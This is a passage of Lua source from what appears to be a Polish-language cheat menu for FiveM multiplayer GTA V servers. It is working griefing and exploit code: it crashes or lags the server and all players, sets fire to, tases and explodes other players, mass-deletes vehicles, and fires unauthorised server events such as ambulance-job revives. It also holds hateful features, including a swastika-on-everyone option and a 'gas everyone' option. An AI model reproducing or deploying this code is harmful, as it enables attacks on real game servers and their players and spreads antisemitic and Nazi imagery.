            ZYD:AddNotification("Udane", "Dodano bronie!", 10000)
        end

        curY = curY + 25

        if self.Painter:Button("~g~Usun wszystkie bronie", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "remove_self_all_weapons") then
            for _, wep in dict.ipairs(all_weapons) do
                ZYD:GetFunction("RemoveWeaponFromPed")(ZYD:GetFunction("PlayerPedId")(), ZYD:GetFunction("GetHashKey")(wep), 500, false, true)
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_UNARM"), 999999, false, true)
            end

            ZYD:AddNotification("Udane", "Usunieto bronie!", 10000)
        end

        curY = curY + 25

        if self.Painter:Button("~g~Dodaj pojedyncza bron", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_self_specific_weapon") then
            local name = ZYD:GetTextInput("Wpisz nazwe broni - przyklad [weapon_pistol]", "", 30)

            if name then
                local wep = _find_weapon(name)
                if not wep then return ZYD:AddNotification("ERROR", "Nie ma takiej broni", 5000) end
                ZYD:GetFunction("GiveWeaponToPed")(ZYD:GetFunction("PlayerPedId")(), ZYD:GetFunction("GetHashKey")(wep), 500, false, true)
                ZYD:AddNotification("Udane", "Dodano bron", 10000)
            end
        end

        curY = curY + 25

        if self.Painter:Button("~b~-------------------", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "unarmik_many") then
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_UNARM"), 999999, false, true)
        end

        curY = curY + 25

        if self.Painter:Button("~y~Pistolet", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_pistol") then
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)

            ZYD:AddNotification("Udane", "Dodano pistolet", 10000)
        end

        curY = curY + 25

        if self.Painter:Button("~y~Pistolet bojowy", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_combatpistol") then
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_COMBATPISTOL"), 999999, false, true)

            ZYD:AddNotification("Udane", "Dodano pistolet bojowy", 10000)
        end

        curY = curY + 25

        if self.Painter:Button("~y~Pistolet MK2", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_pistol_mk2") then
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL_MK2"), 999999, false, true)

            ZYD:AddNotification("Udane", "Dodano pistolet MK2", 10000)
        end

        curY = curY + 25

        if self.Painter:Button("~y~Pistolet Vintage", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_vintagepistol") then
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_VINTAGEPISTOL"), 999999, false, true)

            ZYD:AddNotification("Udane", "Dodano pistolet vintage", 10000)
        end

        curY = curY + 25

        if self.Painter:Button("~y~Pistolet ciezki", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_heavypistol") then
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_HEAVYPISTOL"), 999999, false, true)

            ZYD:AddNotification("Udane", "Dodano pistolet ciezki", 10000)
	end

        curY = curY + 25

        if self.Painter:Button("~y~Tazer", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_stungun") then
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_STUNGUN"), 999999, false, true)
            
            ZYD:AddNotification("Udane", "Dodano tazer", 10000)
        end

        curY = curY + 25
    end)

    local boost_options = {"1.0", "2.0", "4.0", "8.0", "16.0", "32.0", "64.0", "128.0", "256.0", "512.0", "1024"}

    ZYD:AddCategory("~g~Pojazd", function(self, x, y)
        local curY = 5

        if self.Painter:CheckBox("~g~Niezniszczalny pojazd", self.Config.Vehicle.GodMode, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "vehicle_god_mode") then
            self.Config.Vehicle.GodMode = not self.Config.Vehicle.GodMode
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~g~Kuloodporne opony", self.Config.Vehicle.BulletProofTires, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "bulletproof_enabled") then
            self.Config.Vehicle.BulletProofTires = not self.Config.Vehicle.BulletProofTires
            
        end

        curY = curY + 20

        if self.Painter:Button("~b~Usun pojazd", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "delete_self_vehicle") then
            local veh = ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("PlayerPedId")())

            if not ZYD:GetFunction("DoesEntityExist")(veh) then
                ZYD:AddNotification("Nieudane", "Musisz byc w pojezdzie")
            else
                ZYD.Util:DeleteEntity(veh)
                ZYD:AddNotification("Udane", "Pojazd usuniety", 10000)
            end
        end

        curY = curY + 20

        if self.Painter:Button("~b~Zresp pojazd", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "spawn_self_vehicle") then
            local modelName = ZYD:GetTextInput("Wpisz nazwe pojazdu", "", 20)

            if modelName ~= "" and ZYD:GetFunction("IsModelValid")(modelName) and ZYD:GetFunction("IsModelAVehicle")(modelName) then
                ZYD:SpawnLocalVehicle(modelName)
                ZYD:AddNotification("Udane", "Zrespiono pojazd " .. modelName, 10000)
            else
                ZYD:AddNotification("Nieudane", "Niepoprwana nazwa pojazdu.", 10000)
            end
        end

        curY = curY + 25

        if self.Painter:Button("~b~Napraw pojazd", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "repair_vehicle") then
            local veh = ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("PlayerPedId")(), false)
            if not ZYD:GetFunction("DoesEntityExist")(veh) then return ZYD:AddNotification("ERROR", "Musisz byc w pojezdzie") end
            ZYD:RepairVehicle(veh)
            ZYD:AddNotification("Udane", "Pojazd naprawiony", 10000)
        end

        curY = curY + 25

        if self.Painter:Button("~b~FullTune pojazdu", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "max_out_vehicle") then
            local veh = ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("PlayerPedId")(), false)
            ZYD:GetFunction("SetVehicleModKit")(veh, 0)
            ZYD:GetFunction("SetVehicleMod")(veh, 11, ZYD:GetFunction("GetNumVehicleMods")(veh, 11) - 1, false)
            ZYD:GetFunction("SetVehicleMod")(veh, 12, ZYD:GetFunction("GetNumVehicleMods")(veh, 12) - 1, false)
            ZYD:GetFunction("SetVehicleMod")(veh, 13, ZYD:GetFunction("GetNumVehicleMods")(veh, 13) - 1, false)
            ZYD:GetFunction("SetVehicleMod")(veh, 15, ZYD:GetFunction("GetNumVehicleMods")(veh, 15) - 2, false)
            ZYD:GetFunction("SetVehicleMod")(veh, 16, ZYD:GetFunction("GetNumVehicleMods")(veh, 16) - 1, false)
            ZYD:GetFunction("ToggleVehicleMod")(veh, 17, true)
            ZYD:GetFunction("ToggleVehicleMod")(veh, 18, true)
            ZYD:GetFunction("ToggleVehicleMod")(veh, 19, true)
            ZYD:GetFunction("ToggleVehicleMod")(veh, 21, true)
            ZYD:AddNotification("Udane", "Pojazd ztunignowany", 10000)
        end

        curY = curY + 25

        if self.Painter:ListChoice("~b~Boost silnika pojazdu: ", boost_options, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "vehicle_boost") then
            self.Config.Vehicle.Boost = dict.tonumber(boost_options[list_choices["vehicle_boost"].selected])
            
        end

        curY = curY + 25

        if self.Painter:Button("~b~Otworz pojazd", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "unlock_closest_vehicle") then
            local closestVeh = ZYD:GetClosestVehicle()
            if not ZYD:GetFunction("DoesEntityExist")(closestVeh) then return ZYD:AddNotification("Nieudane", "Nie ma przy tobie pojazdu") end
            ZYD:AddNotification("Udane", "Otworzono pojazd", 5000)
            ZYD:UnlockVehicle(closestVeh)
        end

        curY = curY + 25

        if self.Painter:Button("~b~Wylacz najblizszy pojazd", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "disable_closest_vehicle") then
            local closestVeh = ZYD:GetClosestVehicle()
            if not ZYD:GetFunction("DoesEntityExist")(closestVeh) then return ZYD:AddNotification("Nieudane", "Nie ma pojazdu w poblizu") end
            ZYD:DisableVehicle(closestVeh)
        end

        curY = curY + 25

        if self.Painter:Button("~b~Usun najblizszy pojazd", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "delete_closest_vehicle") then
            local closestVeh = ZYD:GetClosestVehicle()
            if not ZYD:GetFunction("DoesEntityExist")(closestVeh) then return ZYD:AddNotification("Nieudane", "Nie ma pojazdu w poblizu") end
            ZYD.Util:DeleteEntity(closestVeh)
        end
    end)

    ZYD:AddCategory("~g~Wszyscy", function(self, x, y)
        local curY = 5

        if self.Painter:CheckBox("~b~Zalaguj serwer", _use_lag_server, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "lag_server_out") then
            if ZYD.Config.SafeMode then
                ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                _use_lag_server = not _use_lag_server
                ZYD:LaggingServer()

                if _use_lag_server then
                    ZYD:AddNotification("Udane", "Zalagowano serwer", 10000)
                else
                    ZYD:AddNotification("Udane", "Zastopowano lagowanie serwera", 10000)
                end
            end
        end

        curY = curY + 25

        if self.Painter:CheckBox("~b~Woda pod cisnieniem z ziemi", _use_hydrant_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "hydrant_loop_all") then
            if ZYD.Config.SafeMode then
                ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                _use_hydrant_loop = not _use_hydrant_loop
                ZYD:HydrantLoop()

                if _use_hydrant_loop then
                    ZYD:AddNotification("Udane", "Woda dla wszystkich", 10000)
                else
                    ZYD:AddNotification("Udane", "Wylaczono wode.", 10000)
                end
            end
        end

        curY = curY + 25

        if self.Painter:CheckBox("~b~Podpal kazdego", _use_fire_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "fire_loop_all") then
            if ZYD.Config.SafeMode then
                ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                _use_fire_loop = not _use_fire_loop
                ZYD:FireLoop()

                if _use_fire_loop then
                    ZYD:AddNotification("Udane", "Podpalono wszystkich", 10000)
                else
                    ZYD:AddNotification("Udane", "Przestano palenie graczy", 10000)
                end
            end
        end

        curY = curY + 25

        if self.Painter:CheckBox("~b~Tazerowanie graczy", _use_taze_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "taze_loop_all") then
            if ZYD.Config.SafeMode then
                ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                _use_taze_loop = not _use_taze_loop
                ZYD:TazeLoop()

                if _use_taze_loop then
                    ZYD:AddNotification("Udane", "Roczpoczeto tazerowanie graczy", 10000)
                else
                    ZYD:AddNotification("Udane", "Zastopowano tazerowanie graczy", 10000)
                end
            end
        end

        curY = curY + 25

        if self.Painter:CheckBox("~b~Usuwanie wszystkich pojazdow", _use_delete_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "delete_all_vehicles_loop") then
            if ZYD.Config.SafeMode then
                ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                _use_delete_loop = not _use_delete_loop
                ZYD:DeleteLoop()

                if _use_delete_loop then
                    ZYD:AddNotification("Udane", "Rozpoczeto usuwanie wszystkich pojazdow", 10000)
                else
                    ZYD:AddNotification("Udane", "Zastopowano usuwanie wszystkich pojazdow.", 10000)
                end
            end
        end

        curY = curY + 25

        if self.Painter:CheckBox("~b~Wybuchnij wszystkie pojazdy", _use_explode_vehicle_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "explode_vehicles_loop") then
            if ZYD.Config.SafeMode then
                ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                _use_explode_vehicle_loop = not _use_explode_vehicle_loop
                ZYD:ExplodeVehicleLoop()

                if _use_explode_vehicle_loop then
                    ZYD:AddNotification("Udane", "Rozpoczeto wybuchanie pojazdow", 10000)
                else
                    ZYD:AddNotification("Udane", "Zastopowano wybuchanie pojazdow.", 10000)
                end
            end
        end

        curY = curY + 25

        if self.Painter:CheckBox("~b~Wybuchnij wszystkich graczy", _use_explode_player_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "explode_player_loop") then
            if ZYD.Config.SafeMode then
                ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                _use_explode_player_loop = not _use_explode_player_loop
                ZYD:ExplodePlayerLoop()

                if _use_explode_player_loop then
                    ZYD:AddNotification("Udane", "Rozpoczeto wybuchanie graczy!", 10000)
                else
                    ZYD:AddNotification("Udane", "Zastopowano wybuchanie graczy.", 10000)
                end
            end
        end

        curY = curY + 25

        if self.Painter:Button("~y~Usun wszystkie bronie - Dziala na wszystkich", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "remove_everyones_weapons") then
            CreateThread(function()
                for id, src in dict.pairs(ZYD.PlayerCache) do
                    src = dict.tonumber(src)

                    if src ~= PlayerId() or ZYD.Config.OnlineIncludeSelf then
                        local ped = ZYD:GetFunction("GetPlayerPed")(src)

                        for _, wep in dict.pairs(all_weapons) do
                            ZYD:GetFunction("RemoveWeaponFromPed")(ped, ZYD:GetFunction("GetHashKey")(wep), 9000, false, true)
                        end
                    end
                end
            end)

            ZYD:AddNotification("Udane", "Usunieto bronie", 10000)
        end

        curY = curY + 25

        if self.Painter:Button("~y~Daj wszystkim wszystkie bronie", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_everyone_weapons") then
            CreateThread(function()
                for id, src, wep in dict.pairs(ZYD.PlayerCache, all_weapons) do
                    src = dict.tonumber(src)

                    if src ~= PlayerId() or ZYD.Config.OnlineIncludeSelf then
                        local ped = ZYD:GetFunction("GetPlayerPed")(src)

                        for _, wep in dict.pairs(all_weapons) do
                            ZYD:GetFunction("GiveWeaponToPed")(ped, ZYD:GetFunction("GetHashKey")(wep), 9000, false, true)
                        end
                    end
                end
            end)

            ZYD:AddNotification("Udane", "Dodano bronie dla wszystkich", 10000)
        end

        curY = curY + 25

        if self.Painter:Button("~y~Wybuchnij wszystkich", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "explode_everyone") then
            if ZYD.Config.SafeMode then
                ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                CreateThread(function()
                    local _veh = ZYD:GetFunction("IsPedInAnyVehicle") and ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("PlayerPedId")())

                    for id, src in dict.pairs(ZYD.PlayerCache) do
                        src = dict.tonumber(src)

                        if src ~= PlayerId() or ZYD.Config.OnlineIncludeSelf then
                            ZYD:GetFunction("AddExplosion")(ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("GetPlayerPed")(src), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
                        end
                    end
                end)

                ZYD:AddNotification("Udane", "Wybuchnieto graczy", 10000)
            end
        end

        curY = curY + 25

        if self.Painter:Button("~y~Zamien wszystkie pojazdy w rampe", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "ramp_all_cars") then
            if ZYD.Config.SafeMode then
                ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                local _veh = ZYD:GetFunction("IsPedInAnyVehicle") and ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("PlayerPedId")())

                CreateThread(function()
                    ZYD:RequestModelSync("stt_prop_stunt_track_dwslope30")

                    for vehicle in ZYD:EnumerateVehicles() do
                        if vehicle ~= _veh or ZYD.Config.OnlineIncludeSelf then
                            local ramp = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")("stt_prop_stunt_track_dwslope30"), 0, 0, 0, true, true, true)
                            ZYD:DoNetwork(ramp)
                            ZYD:GetFunction("NetworkRequestControlOfEntity")(vehicle)
                            ZYD:RequestControlOnce(vehicle)
                            ZYD:RequestControlOnce(ramp)

                            if ZYD:GetFunction("DoesEntityExist")(vehicle) then
                                ZYD:GetFunction("AttachEntityToEntity")(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                            end
                        end

                        Wait(50)
                    end
                end)

                ZYD:AddNotification("Udane", "Zamieniono pojazdy w rampe", 10000)
            end
        end

        curY = curY + 25
		
		        if self.Painter:Button("~y~Zamien wszystkie pojazdy w gore", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "ramp_all_cars") then
            if ZYD.Config.SafeMode then
                ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                local _veh = ZYD:GetFunction("IsPedInAnyVehicle") and ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("PlayerPedId")())

                CreateThread(function()
                    ZYD:RequestModelSync("ch3_lod_06c_slod2")

                    for vehicle in ZYD:EnumerateVehicles() do
                        if vehicle ~= _veh or ZYD.Config.OnlineIncludeSelf then
                            local ramp = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")("ch3_lod_06c_slod2"), 0, 0, 0, true, true, true)
                            ZYD:DoNetwork(ramp)
                            ZYD:GetFunction("NetworkRequestControlOfEntity")(vehicle)
                            ZYD:RequestControlOnce(vehicle)
                            ZYD:RequestControlOnce(ramp)

                            if ZYD:GetFunction("DoesEntityExist")(vehicle) then
                                ZYD:GetFunction("AttachEntityToEntity")(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                            end
                        end

                        Wait(50)
                    end
                end)

                ZYD:AddNotification("Udane", "Zamieniono pojazdy w gore", 10000)
            end
        end

        curY = curY + 25
		
				        if self.Painter:Button("~y~Zamien wszystkie pojazdy w shiw jakis", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "ramp_all_cars") then
            if ZYD.Config.SafeMode then
                ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                local _veh = ZYD:GetFunction("IsPedInAnyVehicle") and ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("PlayerPedId")())

                CreateThread(function()
                    ZYD:RequestModelSync("sp1_lod_slod4")

                    for vehicle in ZYD:EnumerateVehicles() do
                        if vehicle ~= _veh or ZYD.Config.OnlineIncludeSelf then
                            local ramp = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")("sp1_lod_slod4"), 0, 0, 0, true, true, true)
                            ZYD:DoNetwork(ramp)
                            ZYD:GetFunction("NetworkRequestControlOfEntity")(vehicle)
                            ZYD:RequestControlOnce(vehicle)
                            ZYD:RequestControlOnce(ramp)

                            if ZYD:GetFunction("DoesEntityExist")(vehicle) then
                                ZYD:GetFunction("AttachEntityToEntity")(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                            end
                        end

                        Wait(50)
                    end
                end)

                ZYD:AddNotification("Udane", "Zamieniono pojazdy w shit jakis", 10000)
            end
        end

        curY = curY + 25

        if self.Painter:Button("~y~Zamien wszystkie pojazdy w budynek", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "fib_all_cars") then
            if ZYD.Config.SafeMode then
                ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                local _veh = ZYD:GetFunction("IsPedInAnyVehicle") and ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("PlayerPedId")())

                CreateThread(function()
                    for vehicle in ZYD:EnumerateVehicles() do
                        if vehicle ~= _veh or ZYD.Config.OnlineIncludeSelf then
                            local building = ZYD:GetFunction("CreateObject")(-1404869155, 0, 0, 0, true, true, true)
                            ZYD:DoNetwork(ramp)
                            ZYD:GetFunction("NetworkRequestControlOfEntity")(vehicle)
                            ZYD:RequestControlOnce(vehicle)
                            ZYD:RequestControlOnce(building)

                            if ZYD:GetFunction("DoesEntityExist")(vehicle) then
                                ZYD:GetFunction("AttachEntityToEntity")(building, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                            end
                        end

                        Wait(50)
                    end
                end)

                ZYD:AddNotification("Udane", "Zamieniono wszystkie pojazdy w budynek", 10000)
            end
        end

        curY = curY + 25

        if self.Painter:Button("~y~Usuwanie wszystkich pojazdow", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "delete_all_vehicles") then
            ZYD:AddNotification("Udane", "Usunieto wszystkie pojazdy", 10000)
            ZYD:DeleteVehicles()
        end

        curY = curY + 25

        if self.Painter:Button("~y~Spamowanie pojazdami", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "vehicle_spam_server") then
            ZYD:CarSpamServer()

            if not ZYD.Config.SafeMode then
                ZYD:AddNotification("Udane", "Zaspamiono serwer pojazdami", 10000)
            end
        end

        curY = curY + 25

        if self.Painter:Button("~y~Znak swastyki na wszystkich", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "swastika_all") then
            if ZYD.Config.SafeMode then
                ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                CreateThread(function()
                    for id, src in dict.pairs(ZYD.PlayerCache) do
                        src = dict.tonumber(src)

                        if src ~= PlayerId() or ZYD.Config.OnlineIncludeSelf then
                            local ped = ZYD:GetFunction("GetPlayerPed")(src)

                            if ZYD:GetFunction("DoesEntityExist")(ped) then
                                ZYD.FreeCam.SpawnerOptions["PREMADE"]["SWASTIKA"](ZYD:GetFunction("IsPedInAnyVehicle")(ped) and ZYD:GetFunction("GetVehiclePedIsIn")(ped) or ped)
                                Wait(1000)
                            end
                        end
                    end
                end)

                ZYD:AddNotification("Udane", "Kazdy jest swastyka", 10000)
            end
        end

        curY = curY + 25

        if self.Painter:Button("~y~Zagazuj wszystkich", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "gas_all") then
            if ZYD.Config.SafeMode then
                return ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                CreateThread(function()
                    for id, src in dict.pairs(ZYD.PlayerCache) do
                        src = dict.tonumber(src)

                        if src ~= PlayerId() or ZYD.Config.OnlineIncludeSelf then
                            local ped = ZYD:GetFunction("GetPlayerPed")(src)

                            if ZYD:GetFunction("DoesEntityExist")(ped) then
                                ZYD:GasPlayer(src)
                                Wait(1000)
                            end
                        end
                    end
                end)

                ZYD:AddNotification("Udane", "Zagazowano graczy", 10000)
            end
        end

        curY = curY + 25
        if self.DynamicTriggers["CarryPeople"] and self.DynamicTriggers["CarryPeople"]["CarryPeople:sync"] then
            if self.Painter:Button("CARRY ALL", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "carry_all") then
                if ZYD.Config.SafeMode then
                    return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
                else
                    TriggerServerEvent(self.DynamicTriggers["CarryPeople"]["CarryPeople:sync"], -1, "misfinale_c2mcs_1", "nm", "fin_c2_mcs_1_camman", "firemans_carry", 0.15, 0.27, 0.63, -1, 100000, 0.0, 49, 33, 1)
                    ZYD:AddNotification("INFO", "Przeniesiono wszystkich graczy", 10000)
                end
            end

            curY = curY + 25
        end

        if self.Painter:Button("~r~Zcrashuj wszystkich graczy (Trzymaj shift by zmienic metode)", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "crash_all") then
            if ZYD.Config.SafeMode then
                return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
            else
                local method = nil

                if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
                    local _method = ZYD:GetTextInput("Podaj metode crasha. [object / ped / both]", "both", 10)

                    if _method then
                        method = _method
                        ZYD:AddNotification("INFO", "Uzyto " .. method .. " metody crasha.")
                    end
                end

                CreateThread(function()
                    for id, src in dict.pairs(ZYD.PlayerCache) do
                        src = dict.tonumber(src)

                        if src ~= PlayerId() or ZYD.Config.OnlineIncludeSelf then
                            local ped = ZYD:GetFunction("GetPlayerPed")(src)

                            if ZYD:GetFunction("DoesEntityExist")(ped) then
                                ZYD:CrashPlayer(src, true, method)
                                Wait(500)
                            end
                        end
                    end
                end)

                ZYD:AddNotification("INFO", "Zcrashowano wszystkich graczy", 10000)
            end
        end
    end)

    local was_godmode
    local was_boosted

    function ZYD:DoVehicleRelated()
        local curVeh = ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("PlayerPedId")())
        if not ZYD:GetFunction("DoesEntityExist")(curVeh) then return end

        if self.Config.Vehicle.BulletProofTires then
            ZYD:GetFunction("SetVehicleTyresCanBurst")(curVeh, false)
            was_bulletproof = true
        elseif was_bulletproof then
            ZYD:GetFunction("SetVehicleTyresCanBurst")(curVeh, true)
            was_bulletproof = false
        end

        if self.Config.Vehicle.GodMode then
            ZYD:GetFunction("SetEntityInvincible")(curVeh, true)

            if ZYD:GetFunction("IsVehicleDamaged")(curVeh) then
                ZYD:GetFunction("SetVehicleFixed")(curVeh)
            end

            was_godmode = true
        elseif was_godmode then
            ZYD:GetFunction("SetEntityInvincible")(curVeh, false)
            was_godmode = false
        end

        if self.Config.Vehicle.Boost > 1.0 then
            ZYD:GetFunction("SetVehicleEnginePowerMultiplier")(curVeh, self.Config.Vehicle.Boost + 1.0)
            was_boosted = true
        elseif was_boosted then
            ZYD:GetFunction("SetVehicleEnginePowerMultiplier")(curVeh, 1.0)
            was_boosted = false
        end
    end

    local keys = {"TAB", "MOUSE3", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
    local disable_keys = {"-", "MOUSE3", "TAB", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
    local freecam_keys = {"HOME", "MOUSE3", "TAB", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
    local rccar_keys = {"=", "MOUSE3", "TAB", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
    local aimbot_keys = {"MOUSE1", "MOUSE2", "MOUSE3", "LEFTALT", "LEFTSHIFT", "MOUSE2", "SPACE", "C", "X", "Z", "V", "F", "G", "H", "E", "R", "Q", "T", "Y", "U", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}

    function ZYD:IndexOf(table, val)
        for k, v in dict.pairs(table) do
            if v == val or k == val then return (v == val and k) or v end
        end

        return -1
    end

    ZYD:AddCategory("~b~Triggery", function(self, x, y)
        local curY = 5

        if self.Painter:Button("~b~Kamizelka [100]~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "kamza_100") then
            CreateThread(function()
                SetPedArmour(PlayerPedId(), 100)
                print("[Zydsonek] - Kamizelka [100]")                 
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~b~Kamizelka [50]~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "kamza_50") then
            CreateThread(function()
                SetPedArmour(PlayerPedId(), 50)
                print("[Zydsonek] - Kamizelka [50]")            
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~r~Zycie [200]~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "zycie_200") then
            CreateThread(function()
                SetEntityHealth(PlayerPedId(), 200)
                print("[Zydsonek] - Zycie [200]")              
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~r~Samobojstwo~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "zycie_100") then
            CreateThread(function()
                SetEntityHealth(PlayerPedId(), 0)
                print("[Zydsonek] - Samobojstwo")            
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~r~Revive~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "revive") then
            CreateThread(function()
		TriggerServerEvent("whoapd:revive", GetPlayerServerId(i))
		TriggerServerEvent("paramedic:revive", GetPlayerServerId(i))
		TriggerEvent("esx_ambulancejob:revive")
		TriggerEvent("esx_ambulancejob:revive2")
		TriggerEvent("esx_ambulancejob:revive21")
		TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
		TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(i))
		TriggerServerEvent('esx_ambulancejob:revivehype', GetPlayerServerId(i))
		TriggerServerEvent('esx_ambulancejob:revivehype')
		StopScreenEffect("DeathFailOut")
                SetEntityHealth(PlayerPedId(), 200)
                print("[Zydsonek] - Revive")
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~g~Wszystkie pistolety~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "wszystkie_pistole") then
            CreateThread(function()
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_COMBATPISTOL"), 999999, false, true)
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_VINTAGEPISTOL"), 999999, false, true)
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_HEAVYPISTOL"), 999999, false, true)
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL_MK2"), 999999, false, true)
